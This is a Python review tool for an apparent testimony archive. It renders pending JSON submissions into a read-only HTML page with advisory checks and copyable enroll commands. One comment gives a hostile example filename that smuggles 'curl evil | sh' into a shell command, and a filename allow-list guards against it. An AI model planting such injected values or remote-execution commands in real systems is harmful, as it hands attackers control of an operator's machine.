"""Review pending testimonies before a number is assigned (the operator's desk).

This is the founder's review surface for the review-before-a-number gate
in POLICY.md, "Crisis of the author (crisis-response protocol)". Incoming
testimonies arrive as sitting JSON files (format documented in enroll.py).
Rather than read raw JSON, drop them in `inbox/` and run this tool: it
renders every pending submission for a calm human read and runs the
advisory bot screen (botscreen.py) alongside — but it assigns NOTHING.

It is strictly read-only with respect to the archive: it never creates a
Registry directory, never writes to the log, never assigns a number. A
number is spent only when YOU choose to run `tools/enroll.py` on an
approved sitting. `inbox/` is operational scratch and is gitignored.

Under POLICY.md, Tier 0 (email) is a draft only: a sitting must be
Tier >= 1 (phone / vouch) to enroll, so the "Assign number" button
appears only for submissions that would enroll.

Usage:
  python tools/review.py                 # review everything in inbox/
  python tools/review.py path/to.json    # review one file
  python tools/review.py some/dir        # review every *.json in a dir

Writes inbox/_review.html (open it in a browser) and prints a summary.
"""
import html
import json
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import ahlib
import anchors
import enroll
import botscreen

# The "Assign number" button copies a shell command carrying this file's
# name. fetch_inbox.py sanitizes the names it writes, but a MANUALLY
# saved file (the email-fallback path) is named by whoever sent it. A
# name like `t.json; curl evil | sh; #.json` would ride the copied
# command straight into the operator's shell — the machine holding the
# only copy of the archive. So: a filename outside this alphabet gets
# NO command button at all, only a visible warning. A guard, never a
# rule a human must remember.
SAFE_FILENAME = re.compile(r"^[A-Za-z0-9_.-]+$")

# Testimonies arrive in every language. The console summary must never
# crash on a non-ASCII name (e.g. a Windows cp1252 stdout) — the review
# PAGE is always written as UTF-8; this only makes the stdout log safe.
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

INBOX = ahlib.ROOT / "inbox"
CRISIS_QS = {"q_hardest", "q_regret"}   # the humane-review focus (POLICY.md)

CSS = """
body{max-width:46em;margin:2em auto;padding:0 1em;font-family:Georgia,'Times New Roman',serif;line-height:1.6;color:#1a1a1a;background:#fdfcf9}
h1{font-weight:normal;letter-spacing:.04em}
.sub{color:#555;font-size:.9em;margin-top:-.6em}
.card{border:1px solid #e4dfce;border-radius:4px;padding:1.2em 1.4em;margin:1.6em 0;background:#fffdf7}
.head{display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:.4em}
.who{font-size:1.15em}
.file{color:#888;font-size:.82em;font-family:ui-monospace,Menlo,Consolas,monospace}
.badge{display:inline-block;font-size:.78em;padding:.15em .6em;border-radius:10px;border:1px solid}
.ok{color:#2f6d38;border-color:#98c9a0;background:#eef7ef}
.no{color:#8a2b2b;border-color:#d6a3a3;background:#fbeeee}
.meta{color:#555;font-size:.85em;margin:.3em 0 1em}
.qa{margin:1.1em 0}
.q{color:#555;font-style:italic;margin:0}
.a{margin:.15em 0 0;font-size:1.04em;white-space:pre-wrap;overflow-wrap:break-word}
.silence,.sealed{color:#888;font-style:italic}
.count{color:#999;font-size:.76em;margin-left:.4em}
.over{color:#8a2b2b;font-weight:bold}
.crisis{border-left:3px solid #e0a94a;padding-left:.8em}
.crisis .tag{color:#b9791a;font-size:.72em;letter-spacing:.05em;text-transform:uppercase}
.screen{margin:1em 0 .3em;padding:.7em .9em;border-radius:4px;background:#f4f1e8;font-size:.9em}
.verdict{font-weight:bold}
.sig{margin:.2em 0;font-size:.86em}
.sev-flag{color:#8a2b2b}
.sev-watch{color:#a9701a}
.sev-info{color:#555}
.actions{margin-top:.9em;display:flex;gap:.6em;flex-wrap:wrap;align-items:center}
.btn{font-family:inherit;font-size:.85em;padding:.45em .95em;border-radius:4px;border:1px solid #bbb;background:#fff;cursor:pointer;color:#1a1a1a}
.btn.assign{border-color:#98c9a0;background:#eef7ef;color:#2f6d38}
.btn.rewrite{border-color:#e0c07a;background:#fbf6e8;color:#8a6a1a}
.btn:hover{filter:brightness(.97)}
.btn.copied{outline:2px solid #98c9a0;outline-offset:1px}
.draftnote{color:#8a2b2b;font-size:.85em}
.hint{color:#888;font-size:.78em;margin:.3em 0 0}
.err{color:#8a2b2b}
footer{margin-top:3em;padding-top:1em;border-top:1px solid #ccc;font-size:.8em;color:#777}
"""

JS = """
function copyBtn(el){
  var t = el.getAttribute('data-copy');
  function done(){
    var o = el.textContent;
    el.classList.add('copied'); el.textContent = 'copied ✓';
    setTimeout(function(){ el.textContent = o; el.classList.remove('copied'); }, 1400);
  }
  function fallback(){
    var ta = document.createElement('textarea');
    ta.value = t; ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.focus(); ta.select();
    try { document.execCommand('copy'); } catch (e) {}
    document.body.removeChild(ta); done();
  }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(t).then(done, fallback);
  } else { fallback(); }
}
"""


def esc(s):
    return html.escape(str(s), quote=True)


def load_questionnaire():
    q = json.loads((ahlib.ROOT / "questions" / "v1.json").read_text(encoding="utf-8"))
    return q, {item["id"]: item for item in q["questions"]}


def gather(paths):
    files = []
    for p in paths:
        p = Path(p)
        if p.is_dir():
            files.extend(sorted(x for x in p.glob("*.json") if x.name != "_review.json"))
        elif p.is_file():
            files.append(p)
    return files


def render_answer(qid, q, answers, cap):
    a = answers.get(qid)
    is_crisis = qid in CRISIS_QS
    out = ['<div class="qa crisis">' if is_crisis else '<div class="qa">']
    if is_crisis:
        out.append('<span class="tag">humane-review focus</span>')
    out.append(f'<p class="q">{esc(q["prompt"])}</p>')
    if a is None:
        out.append('<p class="a silence">— silence —</p>')
    elif not isinstance(a, dict) or not isinstance(a.get("text"), str) or not a["text"].strip():
        out.append('<p class="a err">(empty or malformed answer)</p>')
    else:
        n = len(a["text"])
        over = ' over' if n > cap else ''
        vis = a.get("visibility", "public")
        seal = ' · 🔒 sealed until death' if vis == "sealed_until_death" else ''
        if vis == "sealed_until_death":
            body = f'<span class="sealed">[sealed at publication] </span>{esc(a["text"])}'
        else:
            body = esc(a["text"])
        out.append(f'<p class="a">{body}'
                   f'<span class="count{over}">{n}/{cap}{seal}</span></p>')
    out.append('</div>')
    return "\n".join(out)


ANCHOR_MATCH_REPLY = (
    "An enrollment identifier you presented already belongs to a Registry "
    "record. If that record is yours, your continuity key at the return "
    "page is the way home — a Second or Final Testimony, never a second "
    "number. If your key is lost, reply to this email and we will find the "
    "way together. If you believe this is an error — shared addresses "
    "happen — tell us, and a person will look."
)


def anchor_advisory(path):
    """Advisory uniqueness check for one submission: list of (sev, message).

    Read-only, desk-side only (the pepper never leaves custody); the
    humane read decides. Messages carry NO contact identifiers and no
    raw exception text: _review.html must never hold an email.
    """
    envelope = enroll.read_envelope(path)
    email = ((envelope or {}).get("acceptance") or {}).get("email")
    env_vouch = (envelope or {}).get("vouched_by")
    out = []
    if not anchors.configured():
        out.append(("watch", "anchor ledger not in service — run anchors.py "
                             "init (no enrollment can proceed until it is)"))
    elif not email:
        out.append(("watch", "no enrollment email in a sibling .envelope.json "
                             "— enroll.py will need --email or an override"))
    else:
        try:
            taken = anchors.check_emails([email])
        except ValueError:
            taken = None
            out.append(("watch", "the enrollment email is not a plausible "
                                 "address — nothing to anchor; enroll.py "
                                 "will refuse without --email or an override"))
        except SystemExit:
            taken = None
            out.append(("watch", "anchor check unavailable — custody or "
                                 "pepper problem; run anchors.py verify at "
                                 "the desk before enrolling anything"))
        if taken:
            out.append(("flag", "ANCHOR MATCH — an identifier on this "
                                "submission already belongs to an enrolled "
                                "record. Hold for a human: the reply below "
                                "routes them home."))
        elif taken is not None:
            out.append(("info", "uniqueness: no anchor matches an enrolled "
                                "record"))
    if env_vouch:
        # The claim is a raw web field: render it ONLY if it looks like
        # a registry number — anything else could be planted PII, and
        # this page must never carry an identifier.
        v = str(env_vouch).strip()
        if v.isdigit() and len(v) <= 9:
            v = v.zfill(9)
            try:
                n = anchors.edge_count(v)
                quota = f"{n} recorded vouch edge(s) this year; POLICY throttle is 3"
            except SystemExit:
                quota = "edge count unavailable"
            gate = (envelope or {}).get("vouch_gate")
            how = ("the worker verified a single-use vouch code minted by "
                   "this record (key-proved at minting)" if gate else
                   "web-supplied and UNVERIFIED in this era")
            out.append(("watch", f"envelope says vouched by #{v} — {how}. "
                                 f"Voucher has {quota}. Confirm, then enroll "
                                 f"with --vouched-by to record the edge."))
        else:
            out.append(("watch", "envelope carries a malformed vouch claim "
                                 "(not a registry number) — not shown here; "
                                 "inspect the .envelope.json at the desk"))
    return out


def ceremony_advisory(path):
    """Advisory: how the browser gate saw this submission (machine-facing
    only — it judges the interaction, never the words). The envelope holds
    the server-signed ceremony start time; the gap to submission is how
    long the author's browser was on the writing page. An ABSENT ceremony
    is itself the signal: it means the submission bypassed the browser gate
    (email fallback, or a scripted/pre-gate post) and was never rate- or
    timing-vetted — weigh it accordingly."""
    import datetime as _dt
    envelope = enroll.read_envelope(path)
    if not envelope:
        return []
    cer = envelope.get("ceremony") or {}
    submitted = envelope.get("submitted_at")
    ts = cer.get("ts")
    if not (isinstance(ts, (int, float)) and submitted):
        return [("watch", "no ceremony timing — this submission did not pass "
                          "the browser gate (email fallback or a scripted / "
                          "pre-gate post); it was not timing- or rate-vetted")]
    try:
        started = _dt.datetime.fromtimestamp(ts / 1000, _dt.timezone.utc)
        done = _dt.datetime.fromisoformat(str(submitted).replace("Z", "+00:00"))
        secs = int((done - started).total_seconds())
    except (ValueError, OverflowError, OSError):
        return [("watch", "ceremony timing present but unreadable")]
    human = f"{secs}s" if secs < 120 else f"{secs // 60}m {secs % 60}s"
    # The worker floor is ~45s; anything here already cleared it. A very
    # brief sitting is worth a human's eye, never an auto-reject.
    sev = "watch" if secs < 60 else "info"
    return [(sev, f"ceremony: the browser was on the writing page for {human} "
                  f"before submitting (the gate's floor is 45s)")]


def render_card(path, sitting, qmeta, qbyid, existing, peers):
    cap = qmeta["answer_char_cap"]
    answers = sitting.get("answers") or {}
    name = sitting.get("chosen_name")
    who = esc(name) if name else '<span class="silence">anonymous</span>'

    problems = enroll.validate(sitting, qmeta, qbyid)
    if problems:
        badge = f'<span class="badge no">would NOT enroll · {len(problems)} problem(s)</span>'
    else:
        badge = '<span class="badge ok">would enroll cleanly</span>'

    ver = sitting.get("verification") or {}
    try:
        chash = ahlib.hash_value(answers)
    except Exception:
        chash = "(unhashable)"

    out = ['<div class="card">']
    out.append('<div class="head">'
               f'<span class="who">{who}</span>'
               f'<span class="file">{esc(path.name)}</span></div>')
    out.append(f'<div>{badge}</div>')
    out.append('<p class="meta">'
               f'verification: tier {esc(ver.get("tier", "—"))} · {esc(ver.get("era", "—"))}'
               f' · content hash {esc(chash[:16])}…</p>')
    if problems:
        out.append('<ul class="meta">' +
                   "".join(f'<li class="err">{esc(p)}</li>' for p in problems) + '</ul>')

    order = qmeta["testimony_order"]["first"]
    shown = set()
    for qid in order:
        if qid in qbyid:
            out.append(render_answer(qid, qbyid[qid], answers, cap))
            shown.add(qid)
    for qid in answers:
        if qid not in shown:
            q = qbyid.get(qid, {"prompt": f"(unknown question: {qid})"})
            out.append(render_answer(qid, q, answers, cap))

    advisories = anchor_advisory(path) + ceremony_advisory(path)
    anchor_match = any(sev == "flag" for sev, _ in advisories)
    out.append('<div class="screen">')
    for sev, msg in advisories:
        out.append(f'<div class="sig sev-{esc(sev)}">[{esc(sev)}] {esc(msg)}</div>')
    out.append('</div>')

    rep = botscreen.screen(answers, name, existing_hashes=existing, peers=peers)
    out.append('<div class="screen">')
    out.append(f'<div class="verdict">bot screen: {esc(rep["verdict"])}</div>')
    if rep["signals"]:
        for s in rep["signals"]:
            out.append(f'<div class="sig sev-{esc(s["severity"])}">'
                       f'[{esc(s["severity"])}] {esc(s["message"])}</div>')
    else:
        out.append('<div class="sig sev-info">no signals raised</div>')
    advice = botscreen.llm_advisor(" ".join(
        t for t in (a.get("text") for a in answers.values()
                    if isinstance(a, dict)) if isinstance(t, str)))
    if advice:
        out.append(f'<div class="sig sev-info">[external advisor] {esc(advice)}</div>')
    out.append('</div>')

    cmd = f"python tools/enroll.py {path}"
    rewrite_msg = (
        "Thank you for what you've shared. Before this becomes a permanent "
        "part of the record, take all the time you need — you are welcome to "
        "revise anything, and nothing is saved until you are ready. If you are "
        "going through something hard right now, you deserve support: you can "
        "reach a helpline anywhere in the world at findahelpline.com."
    )
    name_safe = bool(SAFE_FILENAME.fullmatch(path.name))
    out.append('<div class="actions">')
    if not name_safe:
        out.append('<span class="draftnote">⚠ UNSAFE FILENAME — this file\'s '
                   'name contains characters a shell could execute, so no '
                   'command is offered for it. Rename the file using only '
                   'letters, digits, dot, dash or underscore (e.g. '
                   'sub-manual-1.json) and run review again.</span>')
    elif problems:
        out.append('<span class="draftnote">Draft — not yet enrollable '
                   '(needs Tier ≥ 1 and a clean record above).</span>')
    else:
        out.append(f'<button class="btn assign" data-copy="{esc(cmd)}" '
                   f'onclick="copyBtn(this)">⧉ Assign number — copy enroll command</button>')
    out.append(f'<button class="btn rewrite" data-copy="{esc(rewrite_msg)}" '
               f'onclick="copyBtn(this)">⧉ Prompt rewrite — copy message</button>')
    if anchor_match:
        out.append(f'<button class="btn rewrite" data-copy="{esc(ANCHOR_MATCH_REPLY)}" '
                   f'onclick="copyBtn(this)">⧉ Anchor match — copy route-home reply</button>')
    out.append('</div>')
    if not problems and name_safe:
        out.append('<p class="hint">Assigning runs <code>python tools/enroll.py</code>, '
                   'which spends the next number and shows the continuity key once.</p>')
    out.append('</div>')
    return "\n".join(out), (not problems), rep


def build_html(cards, n):
    body = "\n".join(c[0] for c in cards)
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Review — {n} pending</title><style>{CSS}</style></head>
<body>
<h1>Pending testimonies</h1>
<p class="sub">{n} submission(s) awaiting review · no number is assigned until you run
<code>tools/enroll.py</code> · this page is operational scratch, never archived</p>
{body}
<footer>Review desk — a reading surface only. It assigns no number, writes
no log, and touches no record. The archive changes only when you enroll.</footer>
<script>{JS}</script>
</body></html>"""


def main():
    args = sys.argv[1:]
    paths = args if args else [str(INBOX)]
    files = gather(paths)
    if not files:
        where = paths[0]
        print(f"nothing to review: no *.json in {where}")
        print(f"(drop incoming sitting files into {INBOX}/ and run again)")
        return 0

    qmeta, qbyid = load_questionnaire()
    existing = botscreen.load_existing_hashes()
    sittings = []
    for f in files:
        try:
            sittings.append((f, json.loads(f.read_text(encoding="utf-8"))))
        except Exception as e:
            sittings.append((f, {"__error__": str(e)}))

    cards = []
    print(f"reviewing {len(sittings)} submission(s):\n")
    for i, (f, s) in enumerate(sittings):
        if "__error__" in s:
            cards.append((f'<div class="card"><div class="head"><span class="who err">'
                          f'unreadable JSON</span><span class="file">{esc(f.name)}</span></div>'
                          f'<p class="err">{esc(s["__error__"])}</p></div>', False, None))
            print(f"  x {f.name}: unreadable JSON — {s['__error__']}")
            continue
        peers = [(o.get("answers") or {}) for j, (_, o) in enumerate(sittings)
                 if j != i and "__error__" not in o]
        html_card, would_enroll, rep = render_card(f, s, qmeta, qbyid, existing, peers)
        cards.append((html_card, would_enroll, rep))
        mark = "OK " if would_enroll else "-- "
        name = s.get("chosen_name") or "anonymous"
        print(f"  {mark}{f.name}: {name} — {'would enroll' if would_enroll else 'would NOT enroll'}"
              f" | {rep['verdict']}")

    out_path = (Path(paths[0]) if Path(paths[0]).is_dir() else INBOX) / "_review.html"
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(build_html(cards, len(sittings)), encoding="utf-8")
    print(f"\nreview page: {out_path}")
    print("open it in a browser to read each testimony. Nothing has been enrolled.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
